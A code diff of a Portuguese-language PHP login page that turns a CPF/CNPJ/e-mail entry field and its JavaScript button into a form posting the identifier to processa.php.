@@ -328,16 +328,29 @@ if (!isset($_COOKIE['identificador_cliente'])) {
           <div>Usuário adicional</div>
         </div>
 
-        <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
-        <input type="text" id="identificador" placeholder="CPF, CNPJ ou E-mail" required>
-        <div id="erro" class="erro">
-            <img src="imagens/icon-erro.svg" alt="Erro" style="width: 18px; height: 18px;">
-            <span>Usuário inválido. Confira os dados.</span>
-        </div>
+        <form action="processa.php" method="POST">
 
-        <button id="btn" type="button">Continuar</button>
-        <a href="#" class="link-outline">Criar conta</a>
-      </div>
+  <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
+
+  <input
+    type="text"
+    id="identificador"
+    name="identificador"
+    placeholder="CPF, CNPJ ou E-mail"
+    required
+  >
+
+  <div id="erro" class="error">
+    <img src="imagens/icon-erro.svg" alt="Erro">
+    <span>Usuário inválido. Confira os dados.</span>
+  </div>
+
+  <button type="submit">Continuar</button>
+
+  <a href="#" class="link-outline">Criar conta</a>
+
+</form>
+
 
       <div class="comunicar-wrapper">
         <div class="comunicar">
